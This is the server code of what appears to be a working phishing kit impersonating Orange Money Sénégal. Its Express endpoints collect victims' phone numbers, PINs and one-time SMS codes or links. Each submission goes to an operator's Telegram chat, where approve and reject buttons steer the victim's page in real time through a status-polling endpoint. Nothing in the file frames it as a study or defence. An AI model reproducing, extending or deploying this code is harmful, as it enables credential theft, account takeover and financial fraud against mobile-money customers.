const express = require('express');
const { Telegraf } = require('telegraf');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

// -------------------- INIT BOT --------------------
if (!process.env.BOT_TOKEN) {
    throw new Error("BOT_TOKEN is missing in .env");
}

const bot = new Telegraf(process.env.BOT_TOKEN);
const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();

// -------------------- MEMORY STORE --------------------
const statusStore = {};

// -------------------- MIDDLEWARE --------------------
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// -------------------- ROUTES --------------------
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// -------------------- LOGIN API --------------------
app.post('/api/login-notification', async (req, res) => {
    const { phone, pin } = req.body || {};
    const country = "Sénégal";
    const countryCode = "+221";

    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: true
    });

    if (!phone || !pin || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending_pin";

    const message = `📱 <b>ORANGE MONEY SÉNÉGAL - LOGIN ATTEMPT</b>

🆕 <b>NEW USER</b>
🇸🇳 <b>Country:</b> ${country}
🌍 <b>Country Code:</b> ${countryCode}
📱 <b>Phone Number:</b> ${phone}
🔢 <b>PIN:</b> ${pin}
⏰ <b>Time:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>User waiting for approval</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, message, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Allow to proceed", callback_data: `approve|${phone}|${pin}` },
                        { text: "❌ Invalid PIN", callback_data: `deny|${phone}|${pin}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- FIRST OTP / LINK API --------------------
app.post('/api/verify-first-otp', async (req, res) => {
    const { phone, code } = req.body || {};
    const country = "Sénégal";
    const countryCode = "+221";
    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: true
    });

    if (!phone || !code || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending_link";

    const otpMessage = `🆕 <b>ORANGE MONEY SÉNÉGAL - LINK VERIFICATION NEEDED</b>
🇸🇳 <b>Country:</b> ${country}
📞 <b>Country Code:</b> ${countryCode}
📱 <b>Phone Number:</b> ${phone}
🔑 <b>SUBMITTED LINK / SMS:</b> <code>${code}</code>
⏰ <b>Time:</b> ${currentTime}

<b>━━━━━━━━━━━━━━━━━</b>

⚠️ <b>Verify credentials:</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, otpMessage, {
            parse_mode: 'HTML',
            disable_web_page_preview: true,
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Correct (Approve)", callback_data: `otp1_correct|${phone}` }
                    ],
                    [
                        { text: "❌ Wrong Link / Code", callback_data: `otp1_wrong|${phone}` },
                        { text: "⚠️ Wrong PIN", callback_data: `otp2_wrongpin|${phone}` }
                    ],
                    [
                        { text: "📞 Contact Us", callback_data: `contact_us|${phone}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- BOT ACTIONS --------------------
bot.action(/^approve\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "approved";
    await ctx.answerCbQuery("Allowed");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`✅ <b>LOGIN APPROVED</b>\n📱 <b>User:</b> ${phone}`);
});

bot.action(/^deny\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "wrong_pin";
    await ctx.answerCbQuery("PIN Rejected");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>INVALID PIN REJECTED</b>\n📱 <b>User:</b> ${phone}`);
});

bot.action(/^otp1_correct\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "approved_link";
    await ctx.answerCbQuery("Verified");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`✅ <b>LINK VERIFIED & APPROVED</b>\n📱 <b>User:</b> ${phone}`);
});

bot.action(/^otp1_wrong\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "invalid_link";
    await ctx.answerCbQuery("Wrong Link");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>LINK REJECTED (WRONG/EXPIRED)</b>\n📱 <b>User:</b> ${phone}`);
});

bot.action(/^otp2_wrongpin\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "repeat_pin";
    await ctx.answerCbQuery("Wrong PIN");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`🔑 <b>WRONG PIN REPORTED BY ADMIN</b>\n📱 <b>User:</b> ${phone}`);
});

bot.action(/^contact_us\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "contact_us";
    await ctx.answerCbQuery("Contact Requested");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`📞 <b>CONTACT REQUESTED</b>\n📱 <b>User:</b> ${phone}`);
});

// -------------------- STATUS CHECK API --------------------
app.get('/api/check-status', (req, res) => {
    const phone = req.query.phone;
    const currentStatus = statusStore[phone] || "pending";
    res.json({ status: currentStatus });
});

app.get('/:page', (req, res, next) => {
    if (req.params.page.startsWith('api')) return next();
    const file = req.params.page.endsWith('.html') ? req.params.page : req.params.page + '.html';
    res.sendFile(path.join(__dirname, 'public', file), (err) => {
        if (err) res.status(404).send("Page not found");
    });
});

app.listen(PORT, async () => {
    console.log(`🚀 Server running on port ${PORT}`);
    try {
        await bot.telegram.deleteWebhook({ drop_pending_updates: true });
        bot.launch();
        console.log("🤖 Bot is active");
    } catch (err) {
        console.error("Launch error:", err);
    }
});

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
